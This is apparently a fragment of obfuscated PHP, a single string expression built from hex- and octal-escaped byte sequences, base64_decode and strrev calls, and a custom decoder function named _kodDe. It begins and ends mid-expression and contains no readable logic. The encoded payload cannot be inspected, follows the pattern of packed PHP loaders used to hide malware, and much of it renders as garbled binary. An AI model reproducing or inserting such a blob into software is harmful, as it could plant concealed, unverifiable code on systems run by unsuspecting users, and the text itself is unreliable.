c\x83\x5\x22\x74\xfa\xe2\xf\xc6\x74\xb1\xeb\xa3\x62\xe4\xed\xda"."\27\26\22\44\226\174\211\24\222\310\262\253\14\101\107\372\316\6\146\276\37\262\5\216\241\275\240\75\252\266\242\355\46\312\230\22\303\112\70\310\73\53\5\44\304\106\74\123\322\117\136\2"."\xc3\xc1\x71\x1\xd1\x3a\xa0\xf7\x9e\x30\xd9\x6b\x10\xe5\xe6\x21\xa6\x33\x2\x6\xbe\x4\x33\x10\xa0\x3f\x2b\xb3\x29\x2f\x6a\x38\x60\x5d\x4a\xb7\xb9\x7d\x25\x4c\x5\xd9\xb\x4a\xdc\x66\xe9\x1d\x75\x96\x13\xd8"."\x61\xc9\xc2\xab\x36\xa4\xe3\xa7\x6a\x4c\x2c\x53\xa2\x6e\x3\x5d\x29\xed\x1c\x34\x11\x5f\x9f\xc5\xa3\x9d\x31\x76\xc7\x83\xe3\x58\xb6\xa5\xc6\x42\xc1\x95\xfc\xba\x85\xa7\x36\x7\x96\xb9\x53\xc2\x58\x36\x19\x68"."\51\233\314\45\146\70\235\34\115\325\130\24\213\26\103\221\146\127\201\170\53\267\16\354\114\123\43\341\366\45\145\63\20\153\322\46\25\241\211\341\104\250\315\235\346\254\41\36\12\304\230\351"._kodDe('LA5cfmF1NmhETCoELOmOe9MiRgU7me9nSBOhlJlmbDwqt5/+BMyhlSVjbKzpnNzxYNFUIGY=')."\x78\xa3\xe4\x4a\x7a\xa7\x3b\x49\xb2\xc5\x36\x9f\x7a\x77\x2\xde\xb7\x58\x22\x2d\x6\x31\xbf\xcf\x7\x1f\xe1\x1\x7f\xb7\x9f\x19\xf1\xf2\x8b\x4c\xf8\x15\xf0\x53\x5c\x7b\xc\x98\x8a\x8f\x53\x8b\x48\x8e\x86\xba"."\xcc\x87\xb0\x87\xfa\x3e\xf7\x7b\x32\x95\x3d\x22\x63\x94\x55\x4b\x33\x6d\x83\x30\xbd\xc5\x55\xe3\x2b\xe3\x7c\xae\x9c\x69\xe\x8c\xa4\x38\x2d\x2b\x5d\xb8\x80\xd1\xbf\xe\x19\x14\xeb\xf3\x94\x5\x74\xa0\xb4\xe3"."\x7d\xb4\x9c\xe4\x33\x4c\xb1\x5a\xc4\xb2\x4e\x99\xc9\x22\xb6\xc1\x24\xe6\x48\xbc\xa6\x46\x49\x3e\x47\x15\x88\xa0\xf\x8\xe9\x0\xac\xca\x38\x5b\xbd\x39\xb4\x57\xc2\x66\x1c\x44\x5c\x6b\x4b\x6b\xf8\xe4\x25\x91".base64_decode('tvZox9JYPNG5bPmKlWDNsp4hTVrxMlkIGNX1D2kF/xBzE7AMHzp0yy8zczwR9RGbPGZm0Q==')."\250\10\203\347\142\352\341\57\237\105\153\363\147\163\166\355\44\20\35\5\275\327\64\355\111\162\227\265\175\176\305\220\331\325\155\365\160\54\115\351\103\20\24\12\161\226\70\152\1\223\341\225"."\335\25\140\154\225\371\305\124\257\213\33\200\4\141\324\121\342\31\104\42\67\172\115\243\243\272\120\43\64\207\45\243\321\154\321\14\22\373\244\156\343\246\203\136\155\300\221\57\114\105\17\172".base64_decode('0fHTEXcZOD2R0Pg2s69Q57dxS3JoX4CvAacgLwOyV3C9ILwjtboWIU/khjXiRD+yXpkFBg==')."\376\233\21\117\235\122\272\50\233\14\42\175\314\142\21\33\365\64\352\121\204\51\155\46\214\165\332\310\146\353\200\30\315\21\274\167\122\66\253\300\250\152\166\100\50\232\145\7\270\72\110\322".strrev('VEâX“G))#ß8>„ˆü-Ô≤ìC$∆é6ôﬁóL£çy@‚xåG“Yº'."\r".'‡U¡')."\205\161\32\352\106\331\115\224\173\113\161\170\113\204\270\261\325\264\144\206\265\244\6\304\351\345\102\354\111\175\111\56\142\13\15\221\375\371\155\151\43\303\313\201\341\144\0\130\317\366\4\213"."\xad\xb6\x13\x47\xbc\xa6\x65\x79\xf3\x5\x13\x6b\xc0\x35\x18\xd9\x3e\xbf\x35\xc\x79\x19\xcd\xb2\x97\x39\x4c\xd\x7d\xa1\x9d\x6e\x6c\x51\xa3\x8d\xf3\xc9\xd0\x84\x11\x2f\xc1\x6a\xf6\x11\x89\x99\xf1\x17\x88\xb2"."\x90\x67\x18\xf6\x5\xf\xb1\x82\xa9\xd6\x30\x84\xf1\xa3\xb6\xf9\xb1\x91\x44\xc2\xd0\x72\xc5\xb5\x68\x9c\xdd\xff\x38\x7b\x4f\xb5\x85\xa4\x23\x36\x58\x6b\xe3\xb6\xa9\xb9\xe5\x6a\x61\xde\x9a\x8a\xed\x69\x58\xd8"."\335\105\174\171\240\17\33\30\61\163\314\303\16\365\173\40\333\117\117\351\244\271\374\111\275\144\172\34\373\336\100\113\235\351\366\111\106\310\21\247\327\307\247\221\230\32\226\155\47\342\41\367".strrev('◊)NK⁄‰Í~¸?Ä≈rIÎ§.“WÇl∑ÆmÈÿ‡RälÒt¿>∫[{M9Ë7.f').strrev('nLÿSÓ"lBXE¥uEY+ç:Zµ›»NÎnÈnÔ&ôsôqùôG—,F]C≥GEAoz').base64_decode('Rx2uKk4sa4YdMmO070F8rBrBvi2EWc7OWMRx/wSgrJdj/d4gU/Ayi5kUOaqiT5kZdEoXNw==')."\xd1\x13\x97\x5f\x37\x71\xc7\x65\xfb\x1e\xba\x66\xe2\xfc\x1b\x5f\xbf\xf7\x81\x89\xed\xf7\xd3\x74\x3a\x6a\x4d\x7a\x8e\xcf\xfd\xc4\xe6\x8b\xf7\x3e\x70\xf5\xbe\x5d\xf\xbd\x71\xf9\xae\x77\x1e\x3c\x6f\xdf\xee\x7b"."\260\246\321\265\67\122\305\243\361\13\66\116\134\166\353\370\5\347\356\273\353\214\211\373\57\234\270\372\364\67\256\270\360\265\15\33\141\365\344\210\175\320\100\241\257\50\306\211\26\231\270\356"."\xc1\xf1\x7\x2f\x78\xe3\xd2\x2b\xf6\xed\xde\x2d\xc1\xdb\x58\xf\x2e\x23\x2d\x1f\x34\x93\xe3\x67\x6e\x7a\xe3\xf4\x1d\xe3\x17\x5c\xb4\xf7\xd2\x6b\x4b\xa\xd0\xf\xb8\xe7\x1a\x77\xef\xb2\xb3\xf7\x5e\x79\x86\x94"."\xe3\x2e\xd4\x48\x4c\xa4\x8b\xf3\x39\x2f\x43\x33\xc6\x2f\xdc\xb2\xf7\x27\xb7\xba\xb\x51\x5b\xff\x65\xa\x4d\x6c\x3d\xeb\xf5\x7\xee\x76\x15\x6a\x37\xe3\xc5\x64\x7f\xa3\x64\x8b\x7d\xe2\xbc\xb3\xc6\x77\x5d\xc9".base64_decode('P/L6vVuoMrqrCNd84/C0/lL4OMPqJlO30F7aptlJWMh7d/4MtYeOmDxz47vP3HvdaXt3ng==').base64_decode('AzOxbff4hT+e2HnD3ut38WoBqxzqt7iC2zbuu3vTxOV3c0C87FOKgCEYRWGw4j354N49Fw==')."\xed\x7d\x60\x3b\x46\x92\x73\x37\xee\xdd\x78\xdf\xf8\xf6\x5b\xc7\xaf\xde\xc0\x3f\x3b\x7e\xef\xbd\x62\x94\xa3\x7e\xe2\x85\xac\xc\xc1\x5d\x8a\xd3\x81\xe4\xa6\x85\x7a\x67\xbe\x28\x39\xc2\x93\x89\x1c\x66\xbc\xb8"."\x6\x27\x96\x40\x51\xb7\xc\x8c\x9f\x22\x1e\x14\xc0\x85\x4f\x3\x5b\xb4\x68\x1c\x73\x8d\x66\xa\xc6\x7e\x4d\x5\x22\x9f\x15\xf5\x15\x53\xab\xd0\x6f\x75\x85\xa7\x2\x9f\x2e\x48\x1c\x13\x50\x9c\x40\xda\x51\x51"."\77\265\212\4\252\301\276\321\30\354\35\222\215\143\261\360\100\56\273\30\121\17\351\336\162\61\331\212\360\106\127\347\257\363\263\315\157\361\40\376\242\160\274\325\311\367\34\341\331\200\356\76"."\324\143\12\273\334\154\327\355\141\263\40\353\70\327\325\314\222\51\30\214\226\5\273\0\165\26\40\204\132\200\172\124\225\360\302\55\245\110\7\5\172\251\26\261\3\374\236\333\307\67\335\361"."\306\345\73\335\260\124\152\2\260\230\105\53\361\334\110\137\153\214\137\264\255\364\173\4\336\371\65\6\74\176\332\366\275\227\272\40\231\376\254\42\211\307\104\1\202\375\56\72\302\367\6\271"."\10\305\367\377\315\52\242\302\312\172\54\266\247\11\53\274\235\371\321\142\316\213\305\127\336\270\154\11\323\345\174\250\306\11\217\5\120\116\170\231\147\110\212\275\67\53\202\324\51\122\275\42"."\273\54\223\114\171\23\341\46\335\334\230\106\23\244\141\166\202\45\31\116\255\152\301\41\250\116\16\341\44\127\173\261\106\212\27\261\371\170\215\241\205\153\33\222\237\5\31\304\351\3\313\355".base64_decode('Gcs9CqQIloZ6Za9cI+gchrOxrxUvlq16jdRkOYJwlG1qEnwblAPpLBop9yeJ5o23WGQfLA==').base64_decode('W6l8SmQApBNhXp/srgML07z8itDtDUScrLVSTyYrsymlbmb97PnoL3AZTHGomGdPA1CQeQ==').strrev('ÜS˘˜*tÍ¬â(v.CeÚG`©GA≤<:÷â¿rë*Œ‰aã$qÜπ.√}b¥¯F¥fü¡9:')."\x5a\xa3\x23\x3a\xe3\xbb\x80\xb\x95\xfc\x25\xf0\x9\xe9\x63\x81\x2\x87\xd7\xc4\x12\xe9\xcd\xc\x88\x9e\x10\xfa\x2\x18\x3e\x80\x1a\x6a\x8a\x53\x13\xe1\x57\x25\xca\x90\xec\x2f\xe6\x6\x1a\xa4\x4c\xc5\x36\x4d"."\x25\xab\xe5\x46\xe1\x30\x3a\xcd\xaa\x9f\x66\x2d\xc0\x1f\x6a\xc0\xef\x3f\xac\x69\xcc\xbd\x93\x30\x7\x8d\xf7\x2a\x61\xe8\x93\x9a\xa9\x82\x1c\x7a\x8d\xe5\xc3\x6e\xda\x7c\x78\x23\x8c\x15\x1\xaa\x83\x90\x79\xd8".base64_decode('+KiTLMiIdLaE2yWtPylBDTa1q4GOjrIZMBNUuIxVZnyrJT+dNLQQnciUJH5g1FCBUysUqw==')."\220\144\106\261\53\374\240\104\106\0\4\143\264\320\200\42\225\270\210\222\106\150\342\45\41\232\135\271\150\241\337\200\222\76\377\24\114\266\375\130\175\56\167\42\236\104\131\233\207\244\66\13".base64_decode('S1+KslBT6HA1VJKrkkqlH23tXHd4kbsw96u20K/JmXgBxUx2bORH9SFu2LLsLVlAspFPXA==')."\40\5\265\334\262\322\42\270\162\137\122\316\352\242\217\313\172\344\351\43\317\272\112\113\373\211\120\310\57\144\24\52\365\77\132\376\216\221\137\255\225\101\14\254\7\203\360\232\51\40\150\311"."\1\214\131\142\33\200\146\100\106\7\226\70\320\14\207\127\20\133\122\150\52\342\327\215\344\242\246\40\134\272\255\131\103\53\302\116\154\326\255\53\115\3\25\151\167\126\40\157\270\223\60\6"."\271\323\260\344\107\244\241\375\314\371\31\212\275\62\220\110\141\60\364\127\224\211\264\267\210\10\75\263\73\62\273\230\162\23\211\165\167\125\372\246\257\133\347\67\230\42\41\123\127\142\145\175".base64_decode('HJrGu31OeNQTGHoOCAluSMqrngyL8GD/dPEikysMKliLsKFhURdnoXpYnkoEJvLcMRbUqA==')."\x9d\xc7\x90\x2\x9d\x11\x13\xcb\x79\x30\xd8\x2e\x98\x6c\xbe\x2e\x28\xa5\xf1\x11\xd1\x5d\xc0\x69\x76\x7b\xb1\xf0\x7a\x47\xc7\x59\xe\x7\xf2\x79\x7\x49\x61\x11\x7c\x6b\x95\x31\x7a\xfd\x9c\xe\xd0\x9b\x2c\x5f"."\x52\x3c\x79\x64\x20\x84\xa\xb9\xd2\xb1\xfe\x9f\x2b\x3\xbb\xd7\x21\xc9\x43\x88\x4c\x9a\x5\x4e\xb7\x78\x3a\xaa\x8b\x27\x2\x9a\x63\xda\x22\x91\x12\x9e\xbd\xd0\x4a\x16\x8c\xbc\xed\xa0\x6b\xd4\x89\x73\x5\xf1"."\x9d\xb6\x5a\x1b\xd2\x28\x48\x85\x2\x62\xb9\x86\xa\xe2\x63\xa2\x2\xd1\x31\x9a\xc3\x88\x19\x6f\xe0\x42\xfc\x35\xc4\xf7\x66\x1a\x2a\x48\x27\xac\x7e\x5d\x47\xe5\x9\xad\x2a\xf7\x11\x54\xb0\x42\x61\xd4\x34\xab"."\361\161\54\330\46\332\50\371\143\72\360\107\331\31\203\367\106\201\166\270\77\234\162\52\375\235\72\205\141\22\161\226\231\101\14\61\171\115\101\350\26\341\272\323\130\334\112\201\300\57\146\107"."\54\232\210\6\231\333\71\247\134\226\246\315\142\47\10\213\76\36\25\207\56\366\46\216\253\13\61\10\316\72\370\41\5\260\241\120\314\345\270\376\46\306\127\276\277\65\224\377\323\105\256\70"."\xf5\x54\xcf\x24\xf9\x4a\x97\xc6\x2e\x40\x81\xba\xd2\x1b\xdd\x78\x7f\xd1\x16\x5b\x2c\x76\x62\x91\xc0\xf\xe1\x2d\x48\x96\xc\x81\x62\x33\xa4\x7a\xca\xd7\x45\x1f\xee\x37\xd4\xb0\x17\x51\x4c\x5b\x54\x3c\xa0\x64"."\220\162\216\202\267\206\36\76\352\150\375\373\201\174\212\225\125\211\357\354\300\361\122\245\247\262\312\67\275\272\262\64\207\352\345\72\363\261\172\233\172\162\34\145\202\233\43\330\342\311\313\303".base64_decode('YCQcak+oYdjda+vm+mrEc0DDEkZ9aTgomyPAo+pzdKvM0NBLkwTXKtVzDlErHdKMyUy+1g==')."\325\324\324\170\153\152\321\137\366\114\202\31\232\254\257\251\51\1\251\251\251\47\177\151\6\161\255\6\50\350\314\101\44\221\321\162\0\30\326\165\150\20\354\235\350\30\134\144\314\146\127\20"."\xbf\xf7\x54\x70\xd3\x60\x5a\x84\x56\x2c\xc2\x3e\x62\x89\x95\x91\x55\x87\xe7\x4e\x85\x5c\xe0\x43\x4c\x77\xf\x2\xd7\x8c\x0\x7c\x66\xa2\x7f\x6a\x5e\x9b\x6d\x95\xa8\x21\x7d\x64\x50\xa0\xbd\xfc\x31\x31\x2\x13".strrev('I‚~ÚI≥à)≈xöqï'."\r".'4sÙ∏ù	D(c≤º2ÀﬁZaD“‡ÿ˘è‰∫• ¿›◊}f´').strrev(')ÜÜIG≈!ëè2z8&UaÕ˚'."\n".'≥,1É8:à?Í&ºÌ£Ç7±%»øõ${w é-l…Xã')."\351\325\64\36\127\266\47\111\340\134\3\115\250\357\200\66\22\261\210\61\140\70\155\163\250\122\121\171\154\27\140\100\326\223\204\263\44\256\10\321\257\0\367\242\104\25\220\131\333\24\240\50"."\x34\x4a\xc\xcd\x53\x7f\xc1\x44\x38\x53\x7f\x70\xc9\xe4\xda\xee\x89\x25\x73\xe4\xb8\xb5\x70\xab\xfd\xb1\x98\x34\x53\xec\x22\x2b\xfe\x5\x9a\x79\x2c\x25\xc4\x12\xe8\x15\x5c\x90\xdb\x77\x95\x2a\x70\x67\xb9\xca"."\x4\xe8\xfd\x57\x49\x1\x48\x2f\x85\x26\xd7\x84\x65\xa0\x71\xba\xb\x9a\x58\x72\xd\x72\x83\xd5\xb2\x79\x57\x2a\x57\x92\x34\xc0\x2c\x70\xb1\x21\xd4\x6f\x58\x1d\x43\xd2\x29\xd3\x97\x2f\x98\x7d\x68\xd6\x2d\x79"."\xd0\x50\x7a\x47\xf9\x64\xe\x5e\xa\x59\x6\x88\xb7\x5e\x86\x93\x13\xf1\x85\x24\x73\x44\xe\xe8\x2c\x8c\x10\x68\x29\xbe\x39\x4a\xa0\xc2\x2c\x82\x94\xe8\x5c\xcd\x52\x46\x90\x3b\x3b\x93\x13\xf1\xa9\x55\x56\xb8"."\42\247\12\147\35\370\70\354\114\341\55\373\34\244\143\142\14\33\274\324\313\172\310\24\114\120\44\54\142\222\35\115\252\16\64\141\270\312\364\273\360\10\11\115\12\147\72\115\243\202\6\307"."\55\157\202\20\272\214\236\200\346\0\51\44\213\12\127\20\141\176\224\343\16\153\350\200\246\365\214\27\221\213\71\363\136\75\363\42\26\270\204\101\341\141\345\56\77\345\373\64\74\244\252\54"."\3\302\53\272\225\373\145\57\203\210\116\144\53\301\52\262\157\343\12\352\71\51\224\142\270\166\166\225\211\116\311\26\225\150\172\160\262\102\375\173\53\330\153\371\11\316\371\51\55\0\56\307"."\114\304\75\142\143\321\162\41\134\127\247\213\104\55\161\120\104\336\126\312\272\61\335\124\145\232\257\16\364\146\247\61\257\43\224\36\13\65\11\77\164\273\13\165\253\7\35\165\304\156\2\23".base64_decode('0kWpMasTNxlCKTY/inN3lfYKRa4I7bqJfiy+6VFIMxcQnxVlcrGZDfY1bjgbKD+CMW1+PA==')."\xc6\xd5\x7\x52\xd2\xf6\x19\x91\xf9\xdb\x4\x2d\xe2\x5d\x24\x9a\xea\xd0\x10\x90\x8c\xf6\x73\x50\xd4\xc\xd6\x78\x8d\xb5\x8d\xe8\x7a\x12\x9f\x7\xd2\x89\xdd\x15\x75\x6b\xc6\xe2\x12\x12\x47\x83\xa2\xd2\xce\x4b"."\366\175\233\155\335\314\45\202\320\50\45\101\101\200\137\335\166\46\13\154\22\170\24\227\24\21\313\264\17\152\345\165\342\26\344\204\102\53\60\60\5\75\151\26\122\170\103\224\254\331\344\354"."\x98\xde\x27\x47\x89\x32\x2\x5b\xd\xc2\xac\xba\x5c\x5\x36\x11\x26\x91\x1d\xbc\xa\x3\x49\xbb\x28\x1b\x1c\x93\x3c\x2f\xa0\x98\xe4\x61\x43\x62\x44\xbd\xb5\xa\xe7\x60\x55\x5a\x33\x8d\xcc\x90\x32\x8\x7c\x39"."\146\326\45\215\225\236\247\21\311\124\274\330\313\357\226\135\54\46\173\361\246\310\34\34\173\302\206\53\40\26\240\160\17\54\71\17\125\213\55\236\213\236\311\105\310\67\113\212\320\74\314\104".base64_decode('ibduco6FXWd0slksl1PmUyRLGtEkwzRY5SvFIEHGqM5Usb21dd6ZcIKR37+xwxnsI2hhSQ==').strrev('|πg@1üuDÄ°uì$»13íπ–óâc≈7±\'œäFb5Ñó6\'°∫S	¿3"Ååå∑èÄh').base64_decode('OkI4u8mhre4CQOvDmQ9ONERjqE0o06E96KoEPLXIbkJIKdEPodKPkkzqqkMaGKFIRU1VsQ==')."\67\13\234\310\211\344\204\311\23\113\225\261\60\126\102\225\324\120\0\234\170\253\252\261\241\0\207\264\261\155\224\77\347\306\32\214\170\223\346\72\352\226\34\141\271\34\71\55\107\204\152\154"."\72\112\363\44\16\65\254\263\67\377\354\244\336\321\332\341\347\111\215\174\171\122\101\211\260\204\27\144\152\221\372\210\16\7\274\341\254\221\124\42\321\226\160\60\20\151\12\307\227\50\175\370"."\x56\x55\xa8\xd\xa2\xe6\xaa\x64\xd9\xaa\x96\x70\x47\x43\xfc\xef\x38\x17\x38\x91\x1d\xd3\xe9\x60\xb8\xde\xcb\x7d\xc1\xe0\xa0\xb7\x17\x9d\x23\xbc\x29\x7e\xd6\xb2\xc4\xa9\x8a\xf4\x10\x2a\x13\x8e\xf3\x9c\xd5\x52".base64_decode('rNQLJTXm8NO8TEkZLBEvA50R8l8JOF/QS+FHday+KLVYKlAs0xqAL/8F4sBHhkbskZ6brA==')."\361\106\156\310\260\14\101\16\130\211\121\271\366\100\123\133\270\135\15\104\42\321\345\16\255\137\161\27\120\340\202\224\224\354\114\111\232\31\61\11\364\353\245\146\30\301\350\235\354\250\302\45"."\x5c\xa1\xd3\x27\xdb\xf3\xcc\xb3\xb\x2c\x70\xef\xca\x9d\xab\xd0\xa8\xe4\xec\x2c\x5f\xd0\xc\x4b\x97\x12\xa8\x5f\xae\xe9\xf0\x12\x4e\xcb\x64\x1c\xae\x4b\x33\x69\x29\x5a\x74\xee\xb7\x65\x3f\xa5\xd2\xf\xb0\x34"."\302\350\116\16\20\13\267\264\46\376\307\115\65\122\302\122\237\221\142\152\145\374\275\63\365\273\22\224\35\334\262\157\12\357\76\245\51\377\123\147\161\36\161\11\250\22\313\146\314\53\245\111"."\216\115\300\323\323\264\160\124\245\276\332\305\47\20\27\123\30\315\313\267\260\376\24\324\200\155\222\206\330\215\37\216\210\163\13\206\202\112\360\127\350\151\26\35\322\261\100\221\235\160\230\160"."\16\221\21\30\160\207\52\245\313\333\235\133\371\335\341\313\256\344\33\304\265\12\315\43\67\123\10\262\107\364\11\305\270\53\45\121\324\235\123\246\1\50\133\21\42\57\16\240\64\50\65\324"."\361\42\167\223\243\54\144\126\35\304\7\210\135\301\120\66\157\73\116\372\255\362\103\30\151\112\150\2\226\377\24\270\0\217\316\71\213\342\211\155\140\223\251\312\173\47\241\303\342\374\207\265".strrev('JŒ≥%∆fêS˛-A‘ªtGùÑAR™›E~9ËN£ m.PµÿŒ˙·Ωa:CÇIhÏÕ,')."\112\33\144\271\367\117\301\313\141\337\163\375\346\260\323\327\52\116\161\173\233\163\370\231\223\126\30\261\121\40\173\306\163\26\362\224\270\170\122\210\203\154\5\21\43\230\173\254\247\303\16\272"."\4\130\372\364\64\372\323\15\277\154\67\164\67\202\322\71\370\144\65\107\305\140\277\221\111\25\270\6\226\110\150\323\205\364\201\224\102\204\45\257\61\107\340\304\17\145\23\43\351\340\125\252"."\234\13\102\154\115\324\351\34\113\370\34\23\133\257\323\7\23\277\343\267\304\22\262\154\207\327\257\204\231\320\372\74\24\125\61\121\24\261\306\121\71\54\353\340\223\136\240\114\46\41\114\361"."\371\136\44\1\60\107\236\51\17\361\62\111\351\242\333\155\225\264\76\71\371\225\113\367\145\314\136\55\3\352\201\216\227\163\5\164\104\323\331\26\342\0\243\111\176\55\237\27\367\41\362\216".base64_decode('i/53PIqGvM5Eq0oMhKhUaSEucE66o6SJcF9ZzIXpvYwjtSAdHmXTzPSuRrytBXDUzg56OQ==')."\13\3\46\127\311\56\314\271\234\35\321\43\176\306\366\227\136\260\143\315\62\240\50\304\21\275\120\60\41\326\72\344\323\35\0\50\13\25\201\32\216\205\214\121\11\261\330\324\217\47\241\24"."\x32\x45\xfb\x9c\x54\xc9\xa5\x1a\xf8\xb\x2d\xe7\x21\x8d\x62\x3e\xf9\x69\xd2\xd3\xfc\xa4\x84\xe3\x82\x37\x90\x8d\x1c\x9\x7d\x1b\xb7\x2b\xcf\x52\xb7\xa4\xcc\x5\x29\x5b\x3a\xe0\x7f\xb4\x8c\x53\xd1\x49\x7d\x92"."\x7a\xc4\x33\xea\xcf\x73\xbc\x26\x1e\xed\x3a\xfd\xcb\xe3\x7e\x70\xce\x82\x1f\x46\x4a\xce\x33\xee\xa3\xc\x1f\x56\x57\x81\x98\x7b\x90\x13\x66\xa9\xd0\x59\xa8\x20\x38\x3c\xa6\x4a\xbd\x6\xd2\x56\xea\x75\x55\x1a"."\6\251\337\305\102\306\103\264\61\74\114\311\261\254\343\126\207\33\70\367\204\226\161\375\372\205\25\302\43\7\162\222\113\71\251\136\375\302\336\2\273\266\166\203\31\16\334\105\33\260\170\311".base64_decode('Rw0xl2wQK7Opupmz58sSEzGF4jIXjKLAnTTwOAIpFCcaKsz6s7z6Sabz1Uypl2DXDvA/Ww==')."\x30\xe2\xf0\x41\x41\x25\x45\xdc\x52\x7f\xea\x25\x23\x40\xf0\x54\x52\x7\x93\x36\x44\x97\xde\x8f\x89\x55\x71\x2c\xb1\xea\xe8\x16\x28\x7c\x3\x3b\xbf\x45\xd9\x87\x32\xfd\x90\xf6\x3d\xb1\x58\xa8\x9f\x57\x33\x83"."\17\356\131\174\41\140\27\64\347\171\264\334\261\213\214\4\73\343\141\231\256\210\71\65\243\100\104\43\262\245\163\231\134\243\155\272\345\113\270\70\336\27\211\254\64\232\143\136\32\260\215\11"."\261\332\44\112\364\77\230\100\166\304\242\247\61\241\22\206\273\357\70\231\73\107\301\177\22\43\63\145\174\372\112\12\63\237\323\7\312\351\361\243\245\127\263\275\22\162\112\362\111\335\216\222"."\311\6\162\41\116\300\316\176\273\252\107\305\104\35\75\36\145\62\240\122\166\117\162\375\53\354\32\112\214\36\56\315\136\210\117\42\100\40\17\224\235\54\223\354\231\224\274\356\25\6\170\310"."\xd2\x75\x2c\x63\xc9\xd8\xba\xfc\x3a\x96\x54\x24\xaf\x8f\xd2\xaa\x25\x3f\xaf\x42\xec\x44\xe4\x54\xd0\x23\x58\xdc\x44\x83\x82\x34\x33\xd0\xc2\xdf\x56\x6b\x92\x7e\x9f\x53\x16\x6\xcc\x9d\xe4\xa4\x1c\xd\x9f\xe4".strrev(''."\n".'ƒ[ˇ∑,ùtæªâQ«}õ“á†ÜàFcg~;r˝	ﬁ>\\õ≈1«‘˚ŸD\'¥`ˇí√î€«').base64_decode('OtyBpEpchgPhJC/k6NekrVfssiLUXsyKiCRRJuctnukwbYCt97loBDOYYLncYlNr4TTMjg==')."\x5\xff\x6b\xd7\xaf\xff\xaf\x3c\xbe\xce\xae\x61\xb2\x7f\x87\xa7\xf8\x16\x60\xce\xa1\xb5\xf8\x82\x95\xcb\x3a\xa8\xdc\xd9\xd5\xf\xe7\xf6\x7a\x10\x60\x11\x1a\x7c\x9f\xe4\xa8\x9e\xc4\xb9\x96\x38\xb3\xe0\xc8\xc"."\x3b\x6a\xec\xfe\x4d\xcb\x64\xa4\x4d\xb8\xfc\x71\xa6\xc4\x1f\x37\x42\xbe\x1\xee\xc3\xb9\x5c\xc4\xfd\xfe\xd7\xed\x9b\xbb\x8b\x88\x7d\x99\xdb\xed\x9e\x72\x80\x82\x2e\xf1\x53\x53\x19\x3c\xa6\x49\x8c\x59\x16\x34".strrev('b+Qâ9Ëa´,ûh˝SÚz003.>$°gÈç3<@m)9âußY-û\\ $g)').strrev(')ﬂQX"‰N&¥¢ØT≥ÖIµß[K S'."\r".'\\π¥J:tÿ˘Ç‹<¢Gò·-‰%I®Lñà').base64_decode('JsOTjRvprfG6Emq9ruq452Un3jtcAVNdFLRYYlgcwsRi5PqJ3EN7S8tQHI8LmElWWfm1zg==')."\33\45\104\203\70\44\217\7\243\31\35\5\223\60\215\316\124\56\42\222\164\247\223\222\374\325\315\7\322\344\151\276\222\35\214\221\117\307\254\141\345\75\161\355\231\210\306\102\352\362\60\66"."\61\21\76\45\324\311\214\43\33\46\361\54\302\252\354\154\253\42\257\324\140\61\240\23\115\263\51\320\112\107\204\115\22\6\13\13\277\166\66\37\344\227\264\316\267\316\322\213\10\146\137\113".base64_decode('Fk86gfGzFue6XFQOLGkWLNk8piMTs2Amyo2xM3VnDi1qPWnrKQVv5g7+vmtWzcyez6sF5Q==')."\x73\xc8\x59\x5f\x0\x9\x7\x8d\xf8\x4c\x2f\xd3\xf3\x65\x30\x65\xcb\x99\xd4\x1e\x4e\xb9\x3c\xec\xe4\xde\x76\x20\x91\x70\x4b\xe3\x76\x47\xd3\xec\xb0\x35\x55\x2f\x89\x4b\x15\x62\x75\xb\xfc\x12\x4d\x32\x37\xed".base64_decode('ZlCwGa48TCYmz8UnVX4TzbyWYB06PzbKhR9q+An+gZR7pZpVmUoRlg8IKQ+hvqXnQ/iSXQ==').strrev('l§Dh∞Ωí’˚˘‚Ø;› ‘7'."\n".'Ã…$…ë”îØGI∫I9Õ≥!∆∞®vHÉ>˛Ybç')."\122\212\131\163\105\277\370\51\176\130\230\104\42\331\364\76\53\60\244\161\253\143\356\122\235\216\103\255\164\161\237\44\24\42\124\172\67\53\256\214\45\116\222\25\303\247\142\261\311\273\322\45".base64_decode('iir2P21I8MXiXJZKNWtDZUBTuttqHErhoISvlmxoiEcz+rD8dYATb1ocgKWpwsaGVF7cxw==')."\211\156\342\264\162\335\47\24\316\131\134\266\341\301\221\112\44\121\107\115\134\313\105\72\3\143\65\40\241\376\102\273\302\105\75\342\223\116\213\41\34\214\317\31\202\41\57\352\274\216\124\327"."\251\36\113\325\30\117\350\312\2\71\223\124\175\131\161\224\204\2\172\46\42\125\47\337\325\117\132\40\136\376\43\2\53\235\103\54\231\132\21\31\214\175\61\35\203\57\355\131\274\143\0\31".base64_decode('kzMdzXFPLTmECvSliVki0qd5AWcWhdddrZcLuHtGSzh8+Mnpw4ad7JdOzKWZpemFksGGBg==').base64_decode('lO+Hu7VsrN1yBFFJSXskRaCEWaYMbVHZYjQLlxQHFUfZSYYAl6VZuGxJNitcMq6knK0VrQ==').base64_decode('SbpXOnggl0qV6bCQ3kigk41nWeDSzwEmuqGJIKt8K4T8yaV6Ua4VZYEnbYUbWvAc+DRaLg==').strrev('rATÂå©ebù5ÂLzÀdÀÊ»˝ÃI˙#’^D2›)ˆPìb©4*SRÜSñm— Q‹‰ø°«')."\245\313\3\4\6\304\201\203\6\4\106\54\130\306\30\20\52\236\354\205\307\64\307\126\122\314\15\344\114\276\75\245\204\6\57\346\234\2\5\367\70\227\324\346\104\375\134\121\62\345\136\366"."\xc1\x89\x7\xb\x89\x4a\xc5\x31\x19\x8d\xbf\xfc\x13\x5a\x70\xf4\xfc\x6c\xa2\xa3\x9e\xee\xb4\x17\x2f\x5b\x69\xa4\xf9\xec\x23\x19\x49\x24\xed\x92\x6\xb\x91\x95\x43\x19\xa6\x8c\x8c\x94\x24\x1\xc7\x2c\x2e\x66".strrev('Ô6ï	fÖ∂”FﬂìÃ¬^p{`≥qŸßtÂ£Ç_É?XÉ¬ØEüp$≤åÒ¬p$s}h')."\303\36\111\161\12\205\304\215\47\156\24\271\112\43\150\113\50\26\11\302\245\74\26\276\304\165\232\113\350\234\43\202\257\350\170\104\336\146\341\162\276\271\350\122\37\20\11\3\146\252\327\34"."\141\246\21\21\136\111\203\44\56\361\64\67\157\51\330\42\100\105\131\15\214\230\26\261\374\64\307\17\316\211\274\244\16\360\115\352\133\235\357\163\24\247\336\36\271\22\367\347\325\0\202\174".strrev('»¬´µÂÎ$§pÅmBÚ…ˆ—≠Y%v 